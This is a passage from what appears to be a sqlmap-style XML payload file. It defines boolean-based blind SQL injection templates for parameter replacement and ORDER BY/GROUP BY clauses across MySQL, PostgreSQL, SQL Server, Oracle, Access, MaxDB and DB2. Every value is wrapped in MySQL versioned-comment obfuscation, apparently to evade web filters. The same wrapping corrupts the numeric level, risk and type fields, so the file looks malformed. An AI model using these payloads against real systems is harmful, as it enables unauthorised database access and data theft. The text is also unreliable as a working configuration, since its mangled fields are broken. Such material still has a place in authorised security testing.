        <vector>/*!50000(CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM DUAL UNION SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000FROM DUAL) END)/**_**/*/</vector>
        <request>
            <payload>/*!50000(CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM DUAL UNION SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000FROM DUAL) END)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM DUAL UNION SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000FROM DUAL) END)/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000Boolean-based blind - Parameter replace (DUAL - original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,2,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM DUAL UNION SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000FROM DUAL) END)/**_**/*/</vector>
        <request>
            <payload>/*!50000(CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM DUAL UNION SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000FROM DUAL) END)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM DUAL UNION SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000FROM DUAL) END)/**_**/*/</comparison>
        </response>
    </test>
    

    
    <test>
        <title>/*!50000Boolean-based blind - Parameter replace (CASE)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE NULL END)/**_**/*/</vector>
        <request>
            <payload>/*!50000(CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE NULL END)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000ELSE NULL END)/**_**/*/</comparison>
        </response>
    </test>

    <test>
        <title>/*!50000Boolean-based blind - Parameter replace (CASE - original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500001,3/**_**/*/</clause>
        <where>/*!500003/**_**/*/</where>
        <vector>/*!50000(CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE NULL END)/**_**/*/</vector>
        <request>
            <payload>/*!50000(CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE NULL END)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000(CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE NULL END)/**_**/*/</comparison>
        </response>
    </test>
    

    
    <test>
        <title>/*!50000MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
            <dbms_version>/*!50000&gt;= 5.0/**_**/*/</dbms_version>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL &gt;= 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
            <dbms_version>/*!50000&gt;= 5.0/**_**/*/</dbms_version>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
            <dbms_version>/*!50000&lt; 5.0/**_**/*/</dbms_version>
        </details>
    </test>

    <test>
        <title>/*!50000MySQL &lt; 5.0 boolean-based blind - ORDER BY, GROUP BY clause (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000FROM INFORMATION_SCHEMA.PLUGINS) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000MySQL/**_**/*/</dbms>
            <dbms_version>/*!50000&lt; 5.0/**_**/*/</dbms_version>
        </details>
    </test>

    <test>
        <title>/*!50000PostgreSQL boolean-based blind - ORDER BY, GROUP BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500002/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE 1/(SELECT 0) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE 1/(SELECT 0) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE 1/(SELECT 0) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    
    <test>
        <title>/*!50000PostgreSQL boolean-based blind - ORDER BY clause (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500003/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE 1/(SELECT 0) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    
    <test>
        
        <title>/*!50000PostgreSQL boolean-based blind - ORDER BY clause (GENERATE_SERIES)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        
        <clause>/*!500003/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT * FROM GENERATE_SERIES(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE 0 END) LIMIT 1)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000PostgreSQL/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500003/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft SQL Server/**_**/*/</dbms>
            <dbms>/*!50000Sybase/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft SQL Server/Sybase boolean-based blind - ORDER BY clause (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500003/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000*(SELECT/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000UNION ALL SELECT/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) END))/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft SQL Server/**_**/*/</dbms>
            <dbms>/*!50000Sybase/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Oracle boolean-based blind - ORDER BY, GROUP BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500003/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN 1 ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Oracle/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Oracle boolean-based blind - ORDER BY, GROUP BY clause (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT (CASE WHEN (/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000) THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE CAST(1 AS INT)/(SELECT 0 FROM DUAL) END) FROM DUAL)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Oracle/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,IIF(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,1,1/0)/**_**/*/</vector>
        <request>
            <payload>/*!50000,IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,1,1/0)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,1,1/0)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft Access/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000Microsoft Access boolean-based blind - ORDER BY, GROUP BY clause (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,IIF(/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000,1/0)/**_**/*/</vector>
        <request>
            <payload>/*!50000,IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000,1/0)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,IIF(/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000,/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000,1/0)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000Microsoft Access/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN 1 ELSE NULL END)/**_**/*/</vector>
        <request>
            <payload>/*!50000,(CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN 1 ELSE NULL END)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN 1 ELSE NULL END)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000SAP MaxDB/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000SAP MaxDB boolean-based blind - ORDER BY, GROUP BY clause (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500002,3/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE NULL END)/**_**/*/</vector>
        <request>
            <payload>/*!50000,(CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE NULL END)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE NULL END)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000SAP MaxDB/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000IBM DB2 boolean-based blind - ORDER BY clause/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500004/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500003/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN 1 ELSE RAISE_ERROR(70001, '/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END FROM SYSIBM.SYSDUMMY1)/**_**/*/</vector>
        <request>
            <payload>/*!50000,(SELECT CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000THEN 1 ELSE RAISE_ERROR(70001, '/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END FROM SYSIBM.SYSDUMMY1)/**_**/*/</payload>
        </request>
        <response>
            <comparison>/*!50000,(SELECT CASE WHEN/**_**/*//*!50000[RANDNUM]/**_**/*//*!50000=/**_**/*//*!50000[RANDNUM1]/**_**/*//*!50000THEN 1 ELSE RAISE_ERROR(70001, '/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END FROM SYSIBM.SYSDUMMY1)/**_**/*/</comparison>
        </response>
        <details>
            <dbms>/*!50000IBM DB2/**_**/*/</dbms>
        </details>
    </test>

    <test>
        <title>/*!50000IBM DB2 boolean-based blind - ORDER BY clause (original value)/**_**/*/</title>
        <stype>/*!500001/**_**/*/</stype>
        <level>/*!500005/**_**/*/</level>
        <risk>/*!500001/**_**/*/</risk>
        <clause>/*!500003/**_**/*/</clause>
        <where>/*!500001/**_**/*/</where>
        <vector>/*!50000,(SELECT CASE WHEN/**_**/*//*!50000[INFERENCE]/**_**/*//*!50000THEN/**_**/*//*!50000[ORIGVALUE]/**_**/*//*!50000ELSE RAISE_ERROR(70001, '/**_**/*//*!50000[RANDSTR]/**_**/*//*!50000') END FROM SYSIBM.SYSDUMMY1)/**_**/*/</vector>
        <request>
